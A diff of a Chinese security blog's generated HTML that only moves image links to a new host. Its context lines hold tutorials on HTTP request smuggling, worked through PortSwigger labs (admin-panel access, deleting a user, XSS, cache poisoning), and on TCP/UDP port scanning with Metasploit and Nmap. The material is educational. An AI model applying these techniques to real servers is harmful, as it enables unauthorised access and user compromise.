@@ -7857,7 +7857,7 @@ data-flex-basis="287px"
 &lt;p>后续如果有新的总结发现也会发自己的&lt;a class="link" href="https://zeddyu.github.io" target="_blank" rel="noopener"
 >垃圾博客&lt;/a>或者先知（就看国际黑客陈师傅给不给过了）&lt;/p>
 &lt;h1 id="tlnr">TL;NR
-&lt;/h1>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191205171217.jpeg"
+&lt;/h1>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191205171217.jpeg"
 loading="lazy"
 >&lt;/p>
 &lt;p>Pic from &lt;a class="link" href="https://twitter.com/SpiderSec/status/1200413390339887104?s=19" target="_blank" rel="noopener"
@@ -7897,7 +7897,7 @@ loading="lazy"
 &lt;p>现如今，浏览器默认是不启用&lt;code>Pipeline&lt;/code>的，但是一般的服务器都提供了对&lt;code>Pipleline&lt;/code>的支持。&lt;/p>
 &lt;/blockquote>
 &lt;p>在 HTTP/1.1 中比较重要的引入就是 pipeline 技术了，以下是使用以及不使用 piepeline 技术的对比图：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191017234109.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191017234109.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以清晰地看到，使用了 pipeline 之后不必再需要等待前一个请求完成其响应再处理第二个请求了，这个有点异步处理的意思在里面。&lt;/p>
@@ -8034,17 +8034,17 @@ response if that amount is exceeded.&lt;/p>
 &lt;p>​ 为了提升用户的浏览速度，提高使用体验，减轻服务器的负担，很多网站都用上了CDN加速服务，最简单的加速服务，就是在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取。这就有了一个很典型的拓扑结构。&lt;/p>
 &lt;/blockquote>
 &lt;p>这里引用 @mengchen 师傅发的图：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191205171057.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191205171057.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>一般来说，反向代理与后端服务器不会使用 pipeline 技术，甚至也不会去使用 Keep-Alive ，更多时候反向代理采取的措施是重用 TCP 链接，因为对于反向代理与后端服务器来说，反向代理服务器与后端服务器 IP 相对固定，不同用户的请求通过代理服务器与后端服务器建立链接，将这两者之间的 TCP 链接进行重用，也就顺理成章了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130132520.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191130132520.png"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130132258.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191130132258.png"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130132605.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191130132605.png"
 loading="lazy"
 >&lt;/p>
 &lt;blockquote>
@@ -8417,22 +8417,22 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>并且 HTTP/0.9 请求包与响应包是都没有 headers 的概念的，也就是说如下：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130142331.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191130142331.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>因为 HTTP/0.9 响应包没有 headers 的特性，在 HTTP Smuggling 中利用起来也就特别的有意思了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130143300.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191130143300.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这张图的意思就是我们在 HTTP Smuggling 的时候使用 HTTP/0.9 进行 Smuggle ，这并不是 HTTP/0.9 标准的格式，但是由于一些中间件已经不支持直接解析 HTTP/0.9 的标准格式了，但是还可能存在解析这种指定 HTTP version 的情况。于是就可能存在以下这种情况：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130143557.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191130143557.png"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130143626.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191130143626.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>上面两个图展现了一个大致的攻击流程，chewy2.jpg 当中的 24-33664 字节有着一个完整的 HTTP 响应报文，当 Golang 在处理 HTTP/0.9 的时候，由于我们指定了&lt;code>Range: bytes=24-33664&lt;/code>，就是我们可以指定获取响应报文的 24-33664 个字节，也就是获取了我们存放在图片当中的 HTTP 报文，然后返回给 Golang ，Golang 对于 HTTP/0.9 再进行标准化去头的处理，这样响应看起来就是一个新的响应了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130153851.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191130153851.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>当一个正常用户去请求的时候，如果 Apache 重新使用了 TCP/IP 链接，就会将我们构造在图片当中的 HTTP 报文当作响应包返回给用户。这也是一个很典型的 HTTP Response Splitting 的思路。具体可以看看视频演示 &lt;a class="link" href="https://www.youtube.com/watch?v=lY_Mf2Fv7kI" target="_blank" rel="noopener"
@@ -8667,7 +8667,7 @@ loading="lazy"
 &lt;/h3>&lt;p>接下来几个攻击方式我们可以通过 @portswigger 提供的几个 Lab 给我们进行练习以加深理解——&lt;a class="link" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener"
 >HTTP request smuggling&lt;/a>&lt;/p>
 &lt;p>在做之前记得要把 BurpSuite 的自动更新 Content-Length 功能取消了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191013185654.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191013185654.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>首先我们来看 CL-TE 的情况：&lt;a class="link" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener"
@@ -8702,10 +8702,10 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>根据题目的提示要求，这里我们发送两次以上 HTTP 请求包：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191013190441.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191013190441.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191013190452.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191013190452.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们就可以使第二次请求构造出 GPOST 的 HTTP Method 了，详细的我们可以按照下面这个流程图来看看：&lt;/p>
@@ -8830,7 +8830,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>根据题目的提示要求，这里我们发送两次以上 HTTP 请求包即可，我们可以收到如下图所示的响应。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191122230209.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191122230209.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>过程流程与 CL-TE 类似，Front 服务器处理这个请求的时候按照 TE 优先处理，会认为上面的请求为一个请求整体，然后转发给 Backend 服务器，Backend 服务器在处理的时候按照 CL 优先处理，会认为&lt;code>12\r\n&lt;/code>为第一个请求的 body ，以下为第二个请求，所以会响应 GPOST 为无法识别的 HTTP Method。&lt;/p>
@@ -8894,7 +8894,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>我们就可以得到如下图的响应：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123002425.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191123002425.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以看到这里是用了两个 TE 字段，并且第二个 TE 字段值非标准值，这里 Front 选择对第一个 TE 进行优先处理，整个请求则为正常请求，会转发给 Backend 服务器，而 Backend 服务器以第二个 TE 进行优先处理，而第二个 TE 值非正常，则会取 CL 字段进行处理，这样这个请求就会因为 CL 字段设置的值 4 而被拆分为两个请求。&lt;/p>
@@ -8994,10 +8994,10 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>得到的响应如下两图&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123154656.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191123154656.png"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123154609.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191123154609.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到第二个请求我们得到了&lt;code>/admin&lt;/code>的响应&lt;/p>
@@ -9051,7 +9051,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>我们可以看到成功访问到了&lt;code>/admin&lt;/code>面板内容，如果不成功可以多发送几次试试看&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123155053.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191123155053.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>得到了删除的 api ，于是我们再利用 HTTP Smuggling 访问这个 &lt;code>/admin/delete?username=carlos&lt;/code> 即可，构造如下数据包：&lt;/p>
@@ -9091,7 +9091,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="g">Host: localhost
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123155603.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191123155603.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这种攻击方式类似 HTTP SSRF ，主要的点就是在控制 CL 数值上，比如说第一个数据包 CL 的值为 28 ，是这么计算的：&lt;/p>
@@ -9134,23 +9134,23 @@ loading="lazy"
 &lt;p>To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.&lt;/p>
 &lt;/blockquote>
 &lt;p>这里根据题目提示，场景是一个 CL-TE 的场景，并且给出一个搜索框，我们尝试随便搜索一个 123 ，可以发现搜索结果“123”直接回显到了相应当中。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124191719.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191124191719.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>尝试使用 HTTP Smuggling 方式访问，但是被 blocked ：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124203138.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191124203138.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>然后我们可以尝试利用搜索回显把 Front 服务器转发的请求头给泄露出来：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124202357.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191124202357.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>如果后面只是添加那个 X-*-Ip 的请求头是访问不了 admin 面板的，因为这样会让 Backend 收到两个重复的请求头，在这个场景当中，Backend 服务器对重复的请求头做出了判断：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124204018.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191124204018.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以我们需要把 Front 服务器添加的请求头给“隐藏”掉，我们就可以利用 Smuggling 通过 body 的方式把其他 Front 服务器添加的请求头“隐藏”掉，然后我们就可以得到 admin 面板回显：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124203108.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191124203108.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>整个流程看起来比较简单，但是仔细做的话，其实 CL 的值比较关键，我们来看看泄露 Front 请求的那个数据包的 CL 值怎么算的：&lt;/p>
@@ -9235,7 +9235,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>只要下面这个 CL 足够大，我们就可以用 HTTP Smuggling 把下一个用户的请求拼接到我们最后一个 comment 参数里面了，然后我们在看评论处就可以看到别人的请求头了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124213544.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191124213544.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="exploit-reflected-xss">Exploit Reflected XSS
@@ -9247,7 +9247,7 @@ loading="lazy"
 &lt;p>To solve the lab, smuggle a request to the back-end server that causes the next user&amp;rsquo;s request to receive a response containing an XSS exploit that executes alert(1).&lt;/p>
 &lt;/blockquote>
 &lt;p>还是依旧的 CL-TE 场景，我们可以在 UA 处发现有一个反射 XSS，but 单是这样没什么用，所以我们得想点办法升级危害。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124235543.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191124235543.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以构造以下数据包，只要发送一次&lt;/p>
@@ -9298,10 +9298,10 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>然后我们随便访问该站任何页面都会被弹窗了，因为我们的请求被嵌入到了上面的第二个请求当中：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191125000410.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191125000410.png"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191125001149.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191125001149.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="turn-an-on-site-redirect-into-an-open-redirect">Turn An On-Site Redirect Into An Open Redirect
@@ -9391,7 +9391,7 @@ loading="lazy"
 &lt;/blockquote>
 &lt;p>这个环境也是一个可以修改 Host 进行跳转的场景，而在&lt;code>/post/next?postId=2&lt;/code>路由正好有一个跳转的 api 供我们使用，这个路由跳转到的是&lt;code>/post?postId=4&lt;/code>。&lt;/p>
 &lt;p>根据题目描述，我们需要实现缓存投毒， 例如这里我们就选择&lt;code>/resources/js/tracking.js&lt;/code>进行投毒，LAB 还给了我们制造投毒的服务，于是我们可以进行以下设置：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191129014911.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191129014911.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>发送以下数据包一次：&lt;/p>
@@ -9446,11 +9446,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>然后访问&lt;code>/resources/js/tracking.js&lt;/code>:&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191129015245.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191129015245.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以看到响应包的跳转地址被我们修改成了我们 exploit 的服务器地址，然后我们访问正常服务器主页试试：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191129015530.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191129015530.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到成功&lt;code>alert(1)&lt;/code>。&lt;/p>
@@ -10092,7 +10092,7 @@ loading="lazy"
 >caddy&lt;/a> 上（现在是 11月 27 日，竟然出 caddy 2 了&amp;hellip;），然后拿他进行了实验，由于自己比较懒用了 docker hub 上的环境 &lt;a class="link" href="https://hub.docker.com/r/abiosoft/caddy" target="_blank" rel="noopener"
 >caddy&lt;/a>。&lt;/p>
 &lt;p>于是就有了：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191129022617.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191129022617.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>当时找到挺开心的，以为一个 CVE 就这么简单的到手了，因为 Netty CVE 给的启示嘛，这也算是一个解析差异。然后当时我跟导师还仔细深入探究了这个产生的原因，跟了一下代码，发现可能是 Go 某个原生库的原因，我本地也单独抽了其中有问题的代码测了一遍，确认就是那个库的原因。&lt;/p>
@@ -10125,7 +10125,7 @@ loading="lazy"
 &lt;p>之后我去查询了一下 HTTP/2 与 HTTP/1.1 的差异，个人认为主要是 HTTP/2 中加入了 Request multiplexing over a single TCP connection ，也就是说使用 HTTP/2 可以使用单个 TCP 连接来进行请求资源，也就减少了 TCP 连接复用的可能性，即使能 Smuggle 也只能打自己；而且对于新的二进制分帧机制引入也对该种攻击做出了限制。&lt;/p>
 &lt;p>具体可以参考 &lt;a class="link" href="https://developers.google.com/web/fundamentals/performance/http2#%E6%AF%8F%E4%B8%AA%E6%9D%A5%E6%BA%90%E4%B8%80%E4%B8%AA%E8%BF%9E%E6%8E%A5" target="_blank" rel="noopener"
 >HTTP/2 简介&lt;/a>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191205225455.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191205225455.png"
 loading="lazy"
 >&lt;/p>
 &lt;h1 id="bonus">Bonus
@@ -10157,16 +10157,16 @@ loading="lazy"
 &lt;p>以及现在还有通过在 TCP/IP 模型中的网络层 ICMP 协议来探测端口的扫描技术。&lt;/p>
 &lt;h1 id="tcp">TCP
 &lt;/h1>&lt;p>TCP报文这里就不再细讲了，也不是重点，放一张TCP数据报文的图，具体可以去百度百科了解：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190605164642.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190605164642.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>TCP三次握手：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190605163446.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190605163446.png"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="tcp-connect-scan">TCP CONNECT SCAN
 &lt;/h2>&lt;p>原理很简单，与目标端口建立3次握手，如果成功建立则为&lt;code>open&lt;/code>，收到&lt;code>RST&lt;/code>则为&lt;code>close&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190605165105.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190605165105.png"
 loading="lazy"
 alt="TCP CONNECT SCAN"
 >&lt;/p>
@@ -10180,7 +10180,7 @@ alt="TCP CONNECT SCAN"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">use auxiliary/scanner/portscan/tcp
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190608234213.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190608234213.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>Nmap 选项参数：&lt;/p>
@@ -10194,7 +10194,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;h2 id="tcp-syn-scan">TCP SYN SCAN
 &lt;/h2>&lt;p>也称为TCP半连接扫描，只发送三次握手的第一次SYN报文段，如果收到&lt;code>ACK+SYN&lt;/code>则为&lt;code>open&lt;/code>，收到&lt;code>RST&lt;/code>则为&lt;code>close&lt;/code>，这种好处是不必等待三次握手完全完成，速度快且不容易被防火墙记录进日志。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190605165140.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190605165140.png"
 loading="lazy"
 alt="TCP SYN SCAN"
 >&lt;/p>
@@ -10235,7 +10235,7 @@ alt="TCP SYN SCAN"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">use auxiliary/scanner/portscan/syn
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190609010618.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190609010618.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>Nmap 参数&lt;/p>
@@ -10256,7 +10256,7 @@ loading="lazy"
 &lt;blockquote>
 &lt;p>​ 如果扫描系统遵循该RFC，当端口关闭时，任何不包含SYN，RST，或者ACK位的报文会导致 一个RST返回而当端口开放时，应该没有任何响应。只要不包含SYN，RST，或者ACK, 任何其它三种(FIN，PSH，and URG)的组合都行。&lt;/p>
 &lt;/blockquote>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190605165320.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190605165320.png"
 loading="lazy"
 alt="TCP XMAS TREE SCAN"
 >&lt;/p>
@@ -10293,7 +10293,7 @@ alt="TCP XMAS TREE SCAN"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">use auxiliary/scanner/portscan/xmas
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190609011211.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190609011211.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>Nmap 选项参数：&lt;/p>
@@ -10327,14 +10327,14 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;h2 id="tcp-null-scan">TCP NULL SCAN
 &lt;/h2>&lt;p>空扫描即&lt;code>flag&lt;/code>位全 0 ，如果没有回复则为&lt;code>open&lt;/code>，收到&lt;code>RST&lt;/code>则为&lt;code>close&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190605165511.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190605165511.png"
 loading="lazy"
 alt="TCP NULL SCAN"
 >&lt;/p>
 &lt;h2 id="tcp-ack-scan">TCP ACK SCAN
 &lt;/h2>&lt;p>使用TCP ACK扫描不能够确定端口的关闭或者开放，因为当发送给对方一个含有 ACK 表示的TCP报文的时候，都返回含有RST标志的报文，无论端口是开放或者关闭。所以，不能使用TCP ACK扫描来确定端口是否开放或者关闭。但是可以利用它来扫描防火墙的配置，用它来发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的。&lt;/p>
 &lt;p>向服务端发送一个带有 ACK 标识的数据包，如果收到带有 RST 标识的响应，则说明服务端没有过滤，不存在状态防火墙。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190605165649.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190605165649.png"
 loading="lazy"
 alt="TCP ACK SCAN"
 >&lt;/p>
@@ -10348,7 +10348,7 @@ alt="TCP ACK SCAN"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use auxiliary/scanner/portscan/ack
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190609011455.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190609011455.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>Nmap 可以用以下命令&lt;/p>
@@ -10362,12 +10362,12 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;h2 id="tcp-window-scan">TCP WINDOW SCAN
 &lt;/h2>&lt;p>TCP 窗口扫描的流程类似于 ACK 扫描，都是向服务端发送带有 ACK 标识的数据包，不同的在于 TCP 窗口扫描会检查收到的 RST 数据包中的窗口大小，如果 RST 数据包中的窗口大小不为零，则说明目标端口是开放的。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190605170017.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190605170017.jpg"
 loading="lazy"
 alt="TCP WINDOW SCAN"
 >&lt;/p>
 &lt;p>如果 RST 数据包中的窗口大小为零，则说明目标端口处于关闭状态。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190605170009.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190605170009.jpg"
 loading="lazy"
 alt="TCP WINDOW SCAN"
 >&lt;/p>
@@ -10434,15 +10434,15 @@ alt="TCP WINDOW SCAN"
 &lt;p>虽然关闭了端口和被过滤的端口会发生的事情稍微有点点不同，但是攻击者处理的方法都一样，IPID都只是增加1。所以，在Idel Scan中无法区别端口到底是关闭的还是已经过滤了。当Nmap记录的IPID增加了1，也就被标记成了close丨filterred。&lt;/p>
 &lt;p>以下三张图大略可以说明端口被打开，关闭，过滤的情况。&lt;/p>
 &lt;p>端口开放：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190609152056.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190609152056.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>端口关闭：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190609155715.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190609155715.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>端口被过滤：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190609160207.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190609160207.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>Idel Scan根本上来讲就是一个隐性扫描，Nmap提供了decoy scanning (-D)，帮助使用者保护自己的身份。如果不是使用的（类似Idel Scan扫描方式）仍然需要攻击者通过自身真实IP向目标发送数据包以获取扫描结果。Idel Scan扫描结果其中之一就有入侵检测系统通常会发送一个Zombie主机已经开始扫描的通知。所以它可以作为一个框架去扫描另外一个目标，当你查阅入侵检测系统（IDS）时，请记住这种可能性。&lt;/p>
@@ -10553,7 +10553,7 @@ loading="lazy"
 &lt;p>UDP适用于不需要或在程序中执行错误检查和纠正的应用，它避免了协议栈中此类处理的开销。对时间有较高要求的应用程序通常使用UDP，因为丢弃数据包比等待或重传导致延迟更可取。&lt;/p>
 &lt;h2 id="udp-scan">UDP SCAN
 &lt;/h2>&lt;p>UDP扫描比较简单，一般如果返回&lt;code>ICMP port unreachable&lt;/code>说明端口是关闭的，而如果没有回应或有回应(有些UDP服务是有回应的但不常见)则认为是&lt;code>open&lt;/code>，但由于UDP的不可靠性，无法判断报文段是丢了还是没有回应，所以一般扫描器会发送多次，然后根据结果再判断。这也是为什么UDP扫描这么慢的原因。&lt;/p>
